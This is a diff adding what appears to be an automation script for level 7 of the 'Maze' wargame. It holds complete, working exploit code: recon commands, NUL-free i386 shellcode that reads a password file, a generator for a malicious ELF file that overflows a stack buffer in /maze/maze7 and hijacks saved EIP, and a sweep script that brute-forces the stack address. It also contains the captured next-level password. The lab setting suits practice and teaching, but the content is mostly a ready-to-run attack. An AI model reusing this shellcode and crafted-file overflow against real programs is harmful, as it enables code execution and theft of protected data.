@@ -1,0 +1,177 @@
+@line id
+@line ls -la /maze/maze7
+@line file /maze/maze7
+@line md5sum /maze/maze7
+@line readelf -lW /maze/maze7 | grep -A1 GNU_STACK
+@line objdump -d -M intel /maze/maze7 | grep -A8 "<Print_Shdrs>:"
+@line objdump -d -M intel /maze/maze7 | grep -B2 -A6 "80492ba:"
+@line objdump -d -M intel /maze/maze7 | grep -A12 "<main>:"
+@line mkdir -p /run/screen/l7 && cd /run/screen/l7
+@vi sc7.py
+#!/usr/bin/env python3
+"""Maze L7 shellcode: open/read/write /etc/maze_pass/maze8 (NUL-free).
+Path built on the stack via pushes (NUL via a pre-push of eax); read into a
+buffer allocated below the strings (sub esp); written to fd 1; exit.
+No NUL in any byte (the payload rides through read(); a NUL would truncate).
+"""
+import sys
+sc = bytes([
+    0x31, 0xC0,                       # xor eax, eax
+    0x50,                             # push eax            (NUL terminator for path)
+    0x68, 0x61, 0x7A, 0x65, 0x38,     # push "aze8"
+    0x68, 0x73, 0x73, 0x2F, 0x6D,     # push "ss/m"
+    0x68, 0x65, 0x5F, 0x70, 0x61,     # push "e_pa"
+    0x68, 0x2F, 0x6D, 0x61, 0x7A,     # push "/maz"
+    0x68, 0x2F, 0x65, 0x74, 0x63,     # push "/etc"
+    0x89, 0xE3,                       # mov ebx, esp        (path)
+    0x31, 0xC9,                       # xor ecx, ecx        (O_RDONLY)
+    0xB0, 0x05,                       # mov al, 5           (open)
+    0xCD, 0x80,                       # int 0x80
+    0x89, 0xC3,                       # mov ebx, eax        (fd)
+    0x83, 0xEC, 0x20,                 # sub esp, 0x20       (buffer)
+    0x89, 0xE1,                       # mov ecx, esp        (buf)
+    0x31, 0xD2,                       # xor edx, edx
+    0xB2, 0x0F,                       # mov dl, 15          (count)
+    0xB0, 0x03,                       # mov al, 3           (read)
+    0xCD, 0x80,                       # int 0x80
+    0x31, 0xDB,                       # xor ebx, ebx
+    0xB3, 0x01,                       # mov bl, 1           (fd 1)
+    0x89, 0xE1,                       # mov ecx, esp        (buf)
+    0x89, 0xC2,                       # mov edx, eax        (nread)
+    0xB0, 0x04,                       # mov al, 4           (write)
+    0xCD, 0x80,                       # int 0x80
+    0x31, 0xDB,                       # xor ebx, ebx
+    0xB0, 0x01,                       # mov al, 1           (exit)
+    0xCD, 0x80,                       # int 0x80
+])
+if __name__ == "__main__":
+    sc = bytes(sc)
+    assert 0 not in sc, "NUL in shellcode"
+    sys.stdout.buffer.write(sc)
+@viend
+@line python3 sc7.py > sc.bin && wc -c sc.bin && od -An -tx1 sc.bin | head -3
+@vi gen.py
+#!/usr/bin/env python3
+"""Maze L7 exploit-file generator, v2.
+maze7 prints ELF section headers but takes every "parameter" from the crafted
+file's own ELF header (main passes the raw header words to Print_Shdrs):
+    [ebp+0x8]  = fd
+    [ebp+0xc]  = e_shoff      -> both lseek offsets (shdr array + back again)
+    [ebp+0x10] = e_shstrndx   -> sh = buf + idx*40 (strtab selection)
+    [ebp+0x14] = e_shnum      -> malloc(e_shnum*40), shdr read, loop bound (jle!)
+    [ebp+0x18] = e_shentsize  -> READ SIZE of the in-loop read(fd, ebp-0x3c, ..)
+The loop reads e_shentsize bytes into the 0x34-byte stack buffer once per
+iteration (single iteration: i=0 runs, the read rewrites i=1, i++ -> 2 > 1
+exits). e_shentsize=0x100 overflows far past saved EIP at buf+0x40.
+The heap is rw-p (NOT executable; GNU_STACK RWE only covers the stack), so the
+shellcode lives IN the stack payload at buf+0x60 and EIP -> buf+0x60 (stack
+address -> sweep). free() runs before the ret on the pointers at buf+0x28 /
+buf+0x30, repaired with the real malloc'd addresses (gdb-measured, ASLR off:
+shdrbuf=0x804d020, strtab=0x804d050).
+Shellcode stack usage after ret: esp = buf+0x44, pushes go down to ~buf+0x08,
+buffer sub esp,0x20 -> ~buf-0x1c: inside Print_Shdrs' free locals, safe.
+printf %s argument = strtab + sh_name; strtab starts with a NUL so it prints
+an empty string (a long garbage %s crashed vfprintf earlier).
+"""
+import struct, sys
+SHOFF      = 0x40     # payload region (== e_shoff, both lseeks)
+STRTAB_OFF = 0x200
+STRTAB_SZ  = 0x80
+PAY_SZ     = 0x100    # = e_shentsize: bytes read into the stack buffer
+SC_OFF     = 0x60     # shellcode offset within the payload (== within buf)
+SHDRBUF    = 0x0804d020
+STRTAB     = 0x0804d050
+def build(buf_addr: int, shellcode: bytes) -> bytes:
+    assert len(shellcode) <= PAY_SZ - SC_OFF - 0x10
+    # ELF header (52 bytes) — main reads exactly 0x34.
+    eh  = b"\x7fELF" + bytes([1, 1, 1, 0]) + b"\x00" * 8   # e_ident
+    eh += struct.pack("<HHIIIIIHHHHHH",
+                      1,          # e_type   REL
+                      3,          # e_machine i386
+                      1,          # e_version
+                      0,          # e_entry
+                      0,          # e_phoff
+                      SHOFF,      # e_shoff  -> both lseeks
+                      0,          # e_flags
+                      52,         # e_ehsize
+                      0,          # e_phentsize
+                      0,          # e_phnum
+                      PAY_SZ,     # e_shentsize == OVERFLOW READ SIZE
+                      1,          # e_shnum  (single loop iteration)
+                      0)          # e_shstrndx -> shdr0 selects the strtab
+    assert len(eh) == 0x34
+    # Payload region at e_shoff: shdr0 (40 bytes) + overflow control block.
+    p  = struct.pack("<IIIIIIIIII",
+                     0,            # sh_name=0 -> printf prints strtab+0 (NUL)
+                     1,            # sh_type
+                     0,            # sh_flags
+                     0,            # sh_addr
+                     STRTAB_OFF,   # sh_offset
+                     STRTAB_SZ,    # sh_size
+                     0, 0, 0, 0)   # sh_link/info/addralign/entsize
+    assert len(p) == 0x28
+    p += struct.pack("<IIIIIII",   # 0x28..0x44: overflow control block
+                     STRTAB,       # 0x28 [ebp-0x14] free(strtab) - repaired
+                     0,            # 0x2c
+                     SHDRBUF,      # 0x30 [ebp-0xc]  free(shdrbuf) - repaired
+                     1,            # 0x34 [ebp-0x8]  i -> 2 > e_shnum: exit
+                     0,            # 0x38 saved ebx (don't care)
+                     0,            # 0x3c saved ebp (don't care)
+                     buf_addr + SC_OFF)  # 0x40 saved EIP -> shellcode on stack
+    p += b"\x90" * (SC_OFF - len(p))     # NOP sled up to the shellcode
+    p += shellcode
+    p += b"\x00" * (PAY_SZ - len(p))
+    f = bytearray(eh)
+    f += b"\x00" * (SHOFF - len(eh))     # pad header so payload lands at e_shoff
+    f += p
+    f += b"\x00" * (STRTAB_OFF - len(f))
+    f += b"\x00" * STRTAB_SZ             # strtab: leading NUL, empty %s
+    return bytes(f)
+if __name__ == "__main__":
+    buf = int(sys.argv[1], 16)
+    sc = bytes.fromhex(sys.argv[2]) if len(sys.argv) > 2 else b"\x90" * 16
+    sys.stdout.buffer.write(build(buf, sc))
+@viend
+@line python3 gen.py 0xbad0b0b0 $(od -An -tx1 -v sc.bin | tr -d ' \n') > probe.elf && wc -c probe.elf
+@vi fire7.py
+#!/usr/bin/env python3
+"""Maze L7 sweep: the Print_Shdrs loop buffer address is env-dependent
+(gdb measured 0xffffdb34 in a plain ssh-exec env), so the crafted file's
+saved-EIP dword (buf+SC_OFF) must be swept inside the LIVE session.
+Per candidate: gen.build(buf, sc) -> evil.elf, run /maze/maze7 evil.elf,
+print HIT buf + the child's stdout (the password) on success.
+"""
+import subprocess, importlib.util, sys
+spec = importlib.util.spec_from_file_location("gen", "/run/screen/l7/gen.py")
+gen = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(gen)
+sc = open("/run/screen/l7/sc.bin", "rb").read()
+for delta in range(-0x1000, 0x1001, 4):
+    buf = 0xffffdb08 + delta
+    with open("/run/screen/l7/evil.elf", "wb") as f:
+        f.write(gen.build(buf, sc))
+    r = subprocess.run(["/maze/maze7", "/run/screen/l7/evil.elf"],
+                       capture_output=True, timeout=20)
+    out = r.stdout
+    # a normal (crashing) candidate still prints its " 0: ..." header row
+    # (tab-separated); the HIT candidate's shellcode writes the bare password
+    if out.strip() and b"\t" not in out and b"0:" not in out:
+        print("HIT buf", hex(buf))
+        print(out.decode("latin-1", "replace"))
+        break
+else:
+    print("none")
+@viend
+@line timeout 900 python3 fire7.py
+@line echo rc=$?
+@line exit
+@line exit
+@sleep 2
+@login2
+@line id
+@waitfor uid=15008 
+@line cat /etc/maze_pass/maze8
+@waitfor avdYfGdEvv 
+@sleep 1
+@line exit
+@sleep 2
